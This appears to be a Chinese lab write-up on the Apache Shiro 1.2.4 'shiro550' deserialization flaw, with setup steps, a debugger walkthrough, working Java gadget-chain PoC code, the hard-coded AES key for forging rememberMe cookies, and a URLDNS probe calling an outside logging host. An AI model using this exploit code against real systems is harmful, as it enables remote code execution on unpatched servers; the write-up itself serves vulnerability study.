# shiro550

环境搭建

下载[https://codeload.github.com/apache/shiro/zip/shiro-root-1.2.4](https://codeload.github.com/apache/shiro/zip/shiro-root-1.2.4)

使用idea打开shiro-shiro-root-1.2.4\samples\web这个web项目即可,这里需要配置一下pom文件,把jstl的具体版本号写一下就行

![Untitled](shiro550%20d5d07248ca894091b8e17a5f3c8ccefd/Untitled.png)

然后添加利用链需要的依赖

```xml
		<dependency>
            <groupId>commons-collections</groupId>
            <artifactId>commons-collections</artifactId>
            <version>3.1</version>
        </dependency>
<dependency>
            <groupId>org.apache.commons</groupId>
            <artifactId>commons-collections4</artifactId>
            <version>4.0</version>
        </dependency>
```

配置好tomcat之后启动:

![Untitled](shiro550%20d5d07248ca894091b8e17a5f3c8ccefd/Untitled%201.png)

([https://github.com/v1f18/SerializerChain/tree/main/shiro-shiro-root-1.2.4/samples/web](https://github.com/v1f18/SerializerChain/tree/main/shiro-shiro-root-1.2.4/samples/web) 这是我用的环境和代码)

shiro提供的RememberMe功能,在用户登入成功之后会通过硬编码的key生成一个base64的加密数据,再次登入的时候会将这个数据发给shiro,然后shiro通过反序列化来解密.即可实现不输入密码登入

因为shiro用的aes加密方式,所以我们也可以通过这个硬编码的key来生成恶意的反序列化串来执行恶意的命令

调用链

```java
OncePerRequestFilter.doFilterInternal()
AbstractShiroFilter.doFilterInternal()
AbstractShiroFilter.createSubject()
WebSubject$Builder.buildWebSubject()
Subject$Builder.buildSubject()
DefaultSecurityManager.createSubject()
DefaultSecurityManager.resolvePrincipals()
DefaultSecurityManager.getRememberedIdentity()
AbstractRememberMeManager.getRememberedPrincipals()
AbstractRememberMeManager.convertBytesToPrincipals()
AbstractRememberMeManager.deserialize()
DefaultSerializer.deserialize()
ObjectInputStream.readObject()
HashSet.readObject()
HashMap.put()
HashMap.hash()
TiedMapEntry.hashCode()
TiedMapEntry.getVaule()
LazyMap.get()
ChainedTransformer.transform()
...
Runtime.exec()

```

### 使用cc11作为poc

poc:

```java
public static byte[] getpayloadcc11() throws  Exception{
        CtClass evil_payload = ClassPool.getDefault().get("util.evil");
        TemplatesImpl templates = new TemplatesImpl();
        SerializeUtil.setFieldValue(templates,"_name","v1f18");
        SerializeUtil.setFieldValue(templates,"_tfactory",new TransformerFactoryImpl());
        SerializeUtil.setFieldValue(templates,"_bytecodes",new byte[][]{evil_payload.toBytecode()});
        InvokerTransformer invokerTransformer = new InvokerTransformer("abc", null, null);

        Map decorate = LazyMap.decorate(new HashMap(), (Transformer) invokerTransformer);
        TiedMapEntry tiedMapEntry = new TiedMapEntry(decorate, templates);
        HashSet hashSet = new HashSet();
        hashSet.add(1);
        Field f,f2 ;
        try {
            f = HashSet.class.getDeclaredField("map");
        } catch (NoSuchFieldException e) {
            f = HashSet.class.getDeclaredField("backingMap");
        }
        f.setAccessible(true);
        //hashset实际上使用hashmap来存储,hashsetMap就是hashmap类
        HashMap hashsetMap = (HashMap) f.get(hashSet);

        try {
            f2 = HashMap.class.getDeclaredField("table");
        } catch (NoSuchFieldException e) {
            f2 = HashMap.class.getDeclaredField("elementData");
        }
        f2.setAccessible(true);
        Object[] array = (Object[])f2.get(hashsetMap);
        Object node = array[0];
        if (node == null){
            node = array[1];
        }
        Field keyField = null;
        try{
            keyField = node.getClass().getDeclaredField("key");
        }catch(Exception e){
            keyField = Class.forName("java.util.MapEntry").getDeclaredField("key");
        }
        keyField.setAccessible(true);
        keyField.set(node,tiedMapEntry);

        SerializeUtil.setFieldValue(invokerTransformer,"iMethodName","newTransformer");

        return SerializeUtil.writeObjectToByteArray(hashSet).toByteArray();
    }
```

使用shiro给的AesCipherService来构造poc

```java
				AesCipherService aesCipherService = new AesCipherService();
        byte[] getpayload = payloadCC11.getpayloadcc11();
        ByteSource encrypt = aesCipherService.encrypt(getpayload,Base64.getDecoder().decode("kPH+bIxk5D2deZiIxcaaaA=="));
        System.out.println(encrypt.toString());
```

运行后得到一串base64的加密字符

![Untitled](shiro550%20d5d07248ca894091b8e17a5f3c8ccefd/Untitled%202.png)

抓取登录包,添加rememberMe字段,将base64的值添加进去:

![Untitled](shiro550%20d5d07248ca894091b8e17a5f3c8ccefd/Untitled%203.png)

开始调试,当用户开启RememberMe功能之后,首先进入getRememberedSerializedIdentity方法

![Untitled](shiro550%20d5d07248ca894091b8e17a5f3c8ccefd/Untitled%204.png)

这个subjectConetxt代表用户的上下文

![Untitled](shiro550%20d5d07248ca894091b8e17a5f3c8ccefd/Untitled%205.png)

这里通过头中的rememberMe字段获取值

![Untitled](shiro550%20d5d07248ca894091b8e17a5f3c8ccefd/Untitled%206.png)

![Untitled](shiro550%20d5d07248ca894091b8e17a5f3c8ccefd/Untitled%207.png)

返回到getRememberedSerializedIdentity方法

![Untitled](shiro550%20d5d07248ca894091b8e17a5f3c8ccefd/Untitled%208.png)

这里对获取到的base64数据解码

![Untitled](shiro550%20d5d07248ca894091b8e17a5f3c8ccefd/Untitled%209.png)

返回到getRememberedPrincipals方法

![Untitled](shiro550%20d5d07248ca894091b8e17a5f3c8ccefd/Untitled%2010.png)

这里的bytes就是为已经base64解码过后的加密数据

进入convertBytesToPrincipals

![Untitled](shiro550%20d5d07248ca894091b8e17a5f3c8ccefd/Untitled%2011.png)

进入decrypt,这里就对暂时为解密的数据解密了

![Untitled](shiro550%20d5d07248ca894091b8e17a5f3c8ccefd/Untitled%2012.png)

![Untitled](shiro550%20d5d07248ca894091b8e17a5f3c8ccefd/Untitled%2013.png)

cipherService里面包含了加密的类型,aes,这个是对称加密,可以通过key解密,所以就导致我们可以构造恶意的反序列化串让shiro解析

具体的硬编码key在AbstractRememberMeManager中

![Untitled](shiro550%20d5d07248ca894091b8e17a5f3c8ccefd/Untitled%2014.png)

![Untitled](shiro550%20d5d07248ca894091b8e17a5f3c8ccefd/Untitled%2015.png)

解密完成后,serialized就是我们构造的恶意反序列化串

跟入deserialize方法,看看具体是怎么反序列化

![Untitled](shiro550%20d5d07248ca894091b8e17a5f3c8ccefd/Untitled%2016.png)

![Untitled](shiro550%20d5d07248ca894091b8e17a5f3c8ccefd/Untitled%2017.png)

getSerializer()方法返回一个默认的反序列化器

进入deserialize方法

![Untitled](shiro550%20d5d07248ca894091b8e17a5f3c8ccefd/Untitled%2018.png)

这里就很熟悉了,因为用的cc11的链子,所以基本上没什么问题,就相当于进入了HashSet的readObject方法了

![Untitled](shiro550%20d5d07248ca894091b8e17a5f3c8ccefd/Untitled%2019.png)

这里使用cc11是因为cc11的限制比较小,只要cc的版本在3.1-3.2.1即可,jdk是没限制的

在cc链里面还有cc2也是可以执行命令的(cc2使用的cc版本是4.0,而shiro默认为3.2.1,所以就不考虑了),只要构造漏洞触发点的时候不使用数组即可

### 使用urldns探测

poc

```java
HashMap hashMap = new HashMap();
        Class<?> aClass = Class.forName("java.net.URL");
        Constructor<?> constructor = aClass.getConstructor(String.class);
        URL url = (URL) constructor.newInstance("http://juu7xg.ceye.io");
        //获取URL类中的hashCode属性
        Field hashCode = aClass.getDeclaredField("hashCode");
        //绕过权限限制
        hashCode.setAccessible(true);
        //设置hashCode的值
        hashCode.set(url,123);
        System.out.println(url.hashCode());
        //添加到HashMap中
        hashMap.put(url,123);
        //设置hashCode的值
        hashCode.set(url,-1);
        return SerializeUtil.writeObjectToByteArray(hashMap).toByteArray();
```

同样获得一串base64的数据后发送即可

![Untitled](shiro550%20d5d07248ca894091b8e17a5f3c8ccefd/Untitled%2020.png)

dns就收到数据了

![Untitled](shiro550%20d5d07248ca894091b8e17a5f3c8ccefd/Untitled%2021.png)